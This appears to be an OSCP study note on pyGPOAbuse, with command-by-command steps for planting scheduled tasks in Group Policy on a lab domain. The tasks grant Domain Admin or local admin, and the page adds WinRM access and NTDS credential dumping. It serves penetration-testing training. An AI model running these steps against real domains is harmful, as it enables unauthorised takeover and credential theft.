---
title: "pyGPOAbuse"
slug: pygpoabuse
category: notes
handbook: oscp
tags: ["active-directory"]
draft: false
pubDatetime: 2026-08-25T22:37:50+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "Partial Python port of SharpGPOAbuse."
---
Partial Python port of SharpGPOAbuse. Writes a Group Policy Preferences immediate scheduled task into an existing GPO (SYSVOL XML + LDAP version/extension attributes).

- Computer task (default): runs as `NT AUTHORITY\SYSTEM` on computers in the GPO scope
- `-user`: runs as the logged-on user
- `-user-as-admin`: user GPO path, but the task still runs as SYSTEM

Not a discovery tool. The account must already be able to edit the GPO object and its `SYSVOL` directory. See [ACL Abuse](/collections/oscp/acl-abuse) for the write path and [Active Directory Enumeration](/collections/oscp/active-directory-enumeration) for the surrounding workflow.

## Install

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
cd pyGPOAbuse
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install .
pygpoabuse --help
```

`python3 pygpoabuse.py` from the repo root works the same way.

## Preconditions

- Domain credential (password, NT hash, or Kerberos ccache)
- Write access to the GPO in LDAP **and** its `SYSVOL` folder
- GPO linked so it applies to the intended computer or user
- GPO GUID (no braces), or resolve by display name with `-gpo-name`
- DC reachable over SMB + LDAP (`-dc-ip` when DNS fails; `-ldaps` for 636)

BloodHound write edges are leads only. Use the GUID inside `CN={...}` / `gPCFileSysPath`, not a different BloodHound object id.

```text
CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=SECURA,DC=YZX
\\SECURA.YZX\SYSVOL\SECURA.YZX\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
```

`31B2F340-016D-11D2-945F-00C04FB984F9` is the well-known Default Domain Policy GUID. It applies domain-wide, including DCs, unless the link/filtering was changed.

## Authentication

```bash
pygpoabuse 'DOMAIN/user' -gpo-id '<GPO_GUID>' -dc-ip '<DC_IP>'
pygpoabuse 'DOMAIN/user:password' -gpo-id '<GPO_GUID>' -dc-ip '<DC_IP>'
pygpoabuse 'DOMAIN/user' -hashes 'LMHASH:NTHASH' -gpo-id '<GPO_GUID>' -dc-ip '<DC_IP>'
pygpoabuse 'DOMAIN/user' -k -ccache ./user.ccache -gpo-id '<GPO_GUID>' -dc-ip '<DC_IP>'
pygpoabuse 'DOMAIN/user' -gpo-name 'Vulnerable Policy' -dc-ip '<DC_IP>'
```

Omit the password to get a prompt (keeps it out of shell history).

## Payload rules

`[+] ScheduledTask ... created!` only means the GPO write succeeded, not that the task will run. Three rules keep the payload runnable:

1. **Use `-powershell`.** Without it the tool wraps the command as `cmd.exe /c "<command>"`, so any inner `"` (like `"Domain Admins"`) closes the string early and `net group` sees the wrong tokens. `-powershell` base64-encodes the args (`-enc`), so quotes and spaces are safe.

2. **Never use `-f` to fix a bad task.** If `ScheduledTasks.xml` exists, `-f` appends and runs `.replace("\\", "\\\\")` on the new task XML, doubling every backslash (`secura\charlotte` becomes `secura\\charlotte`). To recover, run `--cleanup`, then create fresh without `-f`.

3. **Use the sAMAccountName** (`charlotte`), not `DOMAIN\user`. `net group ... /add` accepts the bare name; a stray `\` can break the line and `-f` would double it. With `-powershell` either form works, but the bare name is simplest.

The run below breaks all three at once (it is the failure this note was built from):

```bash
pygpoabuse 'secura.yzx/charlotte' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -dc-ip '<DC_IP>' -taskname 'OSCP-DomainAdmin' \
  -command 'net group "Domain Admins" secura\charlotte /add /domain' \
  -filter-enabled -target-dns-name 'dc01.secura.yzx' -f
```

Without `-command`, the demo payload creates local user `john` / `H4x00r123..` and adds it to local Administrators. Always set `-command`.

## Clean Domain Admin run

When the only tasks in the GPO are from this abuse path:

```bash
# 1. drop the broken XML from earlier attempts
pygpoabuse 'secura.yzx/charlotte' \
  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -dc-ip '<DC_IP>' --cleanup

# 2. create a NEW task (no -f; the file was just removed)
pygpoabuse 'secura.yzx/charlotte' \
  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -dc-ip '<DC_IP>' \
  -taskname 'OSCP-DA2' \
  -powershell \
  -command 'net group "Domain Admins" charlotte /add /domain' \
  -filter-enabled -target-dns-name 'dc01.secura.yzx'
```

`--cleanup` deletes the whole `ScheduledTasks.xml` for that GPO side. Only safe when this abuse created the file (or a copy of the original was saved first).

## Existing XML

| Situation | Action |
| --- | --- |
| No `ScheduledTasks.xml` | Create once, **no** `-f` |
| XML exists, only your failed tasks | `--cleanup`, then create again **without** `-f` |
| XML has legitimate tasks | Save a copy first; `-f` appends but corrupts `\` in the new task, so prefer manual XML edit or a different GPO |

A listing like `C: Create` with the same name means that task already exists in the file; `-f` still appends another block and still doubles backslashes.

## Verify before refresh

Check SYSVOL before forcing policy:

```bash
smbclient //<DC_IP>/SYSVOL -U 'secura.yzx/charlotte' \
  -c 'cd secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/ScheduledTasks; more ScheduledTasks.xml'
```

Expect:

- `<Command>powershell.exe</Command>`
- `<Arguments>-windowstyle hidden -nop -enc ....</Arguments>`
- `<FilterComputer ... type="DNS" name="dc01.secura.yzx"/>`

If `<Arguments>` looks like `/c "net group "Domain Admins" ...` or shows `secura\\charlotte`, do not run `gpupdate` yet; recreate the task.

## DC side

```powershell
gpupdate /force
net group "Domain Admins" /domain
net user charlotte /domain
```

`net user` / `net group` read AD. If the add worked, DA shows up here even in the old WinRM session. `whoami /groups` only updates after a **new** logon.

```bash
evil-winrm -i <DC_IP> -u charlotte -p '...'
# or
nxc smb <DC_IP> -d secura.yzx -u charlotte -p '...' --ntds
```

With a DA credential captured, escalate to SYSTEM on the DC with `impacket-psexec` ([Impacket](/collections/oscp/impacket#da-to-system-on-the-dc)).

## Member host (local admin)

```bash
pygpoabuse 'DOMAIN/user' \
  -gpo-id '<GPO_GUID>' -dc-ip '<DC_IP>' \
  -taskname 'OSCP-LocalAdmin' \
  -powershell \
  -command 'net localgroup administrators DOMAIN\user /add' \
  -filter-enabled -target-dns-name 'host.domain.local'
```

Only when `ScheduledTasks.xml` does not already exist (or after a cleanup). After policy applies:

```bash
nxc smb host.domain.local -d DOMAIN -u user -p 'password'
nxc winrm host.domain.local -d DOMAIN -u user -p 'password'
```

Local admin on a member is not Domain Admin. Continue with [AD Lateral Movement](/collections/oscp/ad-lateral-movement) / [NetExec](/collections/oscp/netexec#dump-credentials-remotely).

## Target filter

`-filter-enabled` limits the immediate task to one computer or user. Without it, every object in the GPO scope runs the task.

```bash
-filter-enabled -target-dns-name 'dc01.domain.local'
-user -filter-enabled -target-username 'DOMAIN\user'
```

`-target-dns-name` is a **computer FQDN**, not the domain FQDN.

```powershell
"$env:COMPUTERNAME.$env:USERDNSDOMAIN"
# DC01.secura.yzx  ->  dc01.secura.yzx
```

## Host-side checks

```powershell
gpupdate /force
$xml = "$env:windir\System32\GroupPolicy\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
Test-Path $xml
if (Test-Path $xml) { Get-Content $xml }
Get-WinEvent -LogName 'Microsoft-Windows-TaskScheduler/Operational' -MaxEvents 200 |
  Where-Object Message -match 'OSCP-DA' |
  Select-Object TimeCreated, Id, Message
```

`gpresult /r` often returns `Access is denied` in restricted WinRM. Prefer XML, Task Scheduler, and `net group`.

## Failure checklist

| Symptom | Likely cause |
| --- | --- |
| Created + gpupdate OK, still only Domain Users | Nested `"` broke `cmd /c` (no `-powershell`), or `-f` doubled `\` |
| Created with `-f`, still nothing | Append corrupted the new task; `--cleanup` and recreate without `-f` |
| Nothing in host XML / no task events | Wrong `-target-dns-name`, GPO not applied to that host, or refresh before the write |
| `GPO id ... does not exist` | Wrong GUID |
| Local admin works, DA does not | Task ran on a member, or used `net localgroup` instead of `net group ... /domain` on a DC |

## Limitations

- Partial SharpGPOAbuse port; no feature parity assumed
- Edits an existing GPO only; does not find or create one
- Blast radius follows the GPO link (Default Domain Policy = every computer unless filtered)
- Visible in GP management and often in audit logs
